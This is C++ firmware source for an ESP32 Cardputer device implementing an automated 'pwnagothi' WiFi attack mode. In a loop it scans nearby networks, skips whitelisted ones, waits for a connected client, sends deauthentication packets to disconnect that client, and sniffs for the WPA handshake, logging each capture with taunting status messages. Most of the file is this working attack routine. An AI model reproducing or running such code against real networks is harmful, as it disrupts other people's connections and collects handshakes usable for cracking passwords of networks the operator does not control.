#include "pwnagothi.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "ArduinoJson.h"
#include "mood.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"

String pwnagothiWhitelist[30];
String pwnagothiMacWhitelist[30];
bool pwnagothiModeEnabled;
bool pwnagothiScan = true;
bool nextWiFiCheck = false;

bool pwnagothiBegin(){
    if(!(WiFi.mode(WIFI_MODE_STA) && WiFi.scanNetworks(true, true))){
        return false;
    }   
    setMood(1, "(o_o)", "3 seconds for auto mode start... ESC to cancel");
    updateUi(true, false);
    
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        M5Cardputer.update();
        auto status = M5Cardputer.Keyboard.keysState();
        for(auto i : status.word){
            if(i=='`'){
                setMood(1, "(^_^)", "Pwnagothi mode cancelled");
                updateUi(true, false);
                delay(5000);
                return false;
            }
        }
    }
    WiFi.scanNetworks(true, true);
    logMessage("Pwnagothi auto mode init!");
    uint16_t trash;
    parseWhitelist(trash);
    pwnagothiMode = true;
    return true;
}

void addToWhitelist(String valueToAdd){
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    for(JsonVariant v : oldArray) {
        array.add(String(v.as<const char*>()));
    }
    array.add(valueToAdd);
    serializeJson(list, whitelist);
    saveSettings();
}

String* parseWhitelist(uint16_t& outCount){
    static String result[30];
    outCount = 0;

    JsonDocument jsonWhitelist;
    DeserializationError err = deserializeJson(jsonWhitelist, whitelist);
    if (err) {
        logMessage("Failed to parse whitelist JSON");
        return result;
    }

    JsonArray array = jsonWhitelist.as<JsonArray>();
    for (JsonVariant v : array) {
        if (outCount >= 30) break;
        result[outCount++] = String(v.as<const char*>());
    }

    return result;
}


void parseMacFromWhitelist() {
  WiFi.mode(WIFI_MODE_STA);  // ensure we can scan
  int netCount = WiFi.scanNetworks(false, true);  // block, include hidden

  for (int i = 0; i < 30; i++) {
    if (pwnagothiWhitelist[i].length() == 0) continue;  // skip unused slots

    bool found = false;
    for (int n = 0; n < netCount; n++) {
      if (WiFi.SSID(n) == pwnagothiWhitelist[i]) {
        uint8_t* mac = WiFi.BSSID(n);
        char macStr[18];
        snprintf(macStr, sizeof(macStr),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        pwnagothiMacWhitelist[i] = String(macStr);
        found = true;
        break;
      }
    }

    if (!found) {
      pwnagothiMacWhitelist[i] = "";  // mark as not found
    }
  }
}

uint8_t wifiCheckInt = 0;

uint8_t getWiFiCheckInt(){
    return wifiCheckInt;
}

void pwnagothiLoop(){
    if(pwnagothiScan){
        logMessage("(<_>) Scanning..");
        setMood(1, "(<_>)", "Scanning..");
        updateUi(true, false);
        WiFi.scanNetworks(false);
        delay(50);
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            logMessage("(*_*) Scan compleated proceding to attack!");
            setMood(1, "(*_*)", "Scan compleated proceding to attack!");
            updateUi(true, false);
            delay(100);
        }
    }
    else{
        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("('_') No networks found. Waiting and retrying");
            updateUi(true, false);
            delay(50);
            pwnagothiScan = true;
            return;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setTargetAP(WiFi.BSSID(wifiCheckInt));
        logMessage("Status: wifiCheckInt: " + String(wifiCheckInt) + " of " + String(WiFi.scanComplete()));
        logMessage("Attack vector: " + WiFi.SSID(wifiCheckInt) + " BSSID: " + WiFi.BSSIDstr(wifiCheckInt) + " Ch: " + String(WiFi.channel(wifiCheckInt)) + " RSSI: " + String(WiFi.RSSI(wifiCheckInt)));
        setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
        updateUi(true, false);
        delay(1000);
        uint16_t whitelistSize;
        String* whitelistParsed = parseWhitelist(whitelistSize);
        logMessage("Size of whiletist: " + String(sizeof(whitelistParsed)));
        for(uint16_t i = 0; i<=whitelistSize; i++){
            logMessage("Whietlist check...");
            if(whitelistParsed[i] == attackVector){
                setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                logMessage("(x_x) " + String("Well, ") + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                updateUi(true, false);
                delay(5000);
                wifiCheckInt++;
                return;
            }
        }
        setMood(1, "(Y_Y)" , "I'm looking inside you " + attackVector + "...");
        updateUi(true, false);
        set_target_channel(attackVector.c_str());
        uint8_t i = 1;
        uint8_t currentCount = SnifferGetClientCount();
        setMac(WiFi.BSSID(wifiCheckInt));
        uint8_t targetChanel = set_target_channel(attackVector.c_str());
        initClientSniffing();
        String clients[50];
        int clientLen;
        unsigned long startTime = millis();
        logMessage("Waiting for clients to connect to " + attackVector);
        while(true){
            get_clients_list(clients, clientLen);
            if (millis() - startTime > 10000) { // 10 seconds timeout
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for clients.");
                logMessage("(~_~) Attack failed: Timeout waiting for clients.");
                esp_wifi_set_promiscuous(false);
                updateUi(true, false);
                delay(100);
                wifiCheckInt++;
                return;
            }
            if(clients[i] != ""){
                logMessage("Client count: " + String(clientLen));
                setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen -1 ]);
                updateUi(true, false);
                delay(80);
                esp_wifi_set_promiscuous(false);
                break;
            }
            updateUi(true, false);
        }
        setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
        logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
        updateUi(true, false);
        if(send_deauth_packets(clients[i], 50)){
            logMessage("Deauth succesful");
        }
        else{
            logMessage("Unknown error with deauth");
        }
        unsigned long startTime1 = millis();
        SnifferBegin(targetChanel);
        while(true){
            SnifferLoop();
            if (SnifferGetClientCount() > currentCount) {
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMood(1, "(^_^)", "Got new handshake!!!" );
                logMessage("(^_^) Got new handshake!!!");
                Sound(1000, 500, true);
                delay(500);
                Sound(1500, 200, true);
                SnifferEnd();
                updateUi(true, false);
                addToWhitelist(attackVector);
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                saveSettings();
                delay(5000);
                break;
            }
            if (millis() - startTime1 > 10000) { // 10 seconds timeout
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                updateUi(true, false);
                delay(70);
                wifiCheckInt++;
                break;
            }
        }
        clearTargetAP();
    }
    setMood(1, "(z_z)", "I'll nap for 3 seconds...");
    logMessage("(z_z) I'll nap for 3 seconds");
    updateUi(true, false);
    delay(3000);
}

void removeItemFromWhitelist(String valueToRemove) {
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    serializeJson(list, whitelist);
    saveSettings();
}

void setWhitelistFromArray(String* arr) {
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    size_t len = 0;
    // Calculate length by finding first empty string or hitting 30
    while (arr[len].length() > 0) {
        len++;
    }
    for (size_t i = 0; i < len; ++i) {
        array.add(arr[i]);
    }
    serializeJson(list, whitelist);
    saveSettings();
}
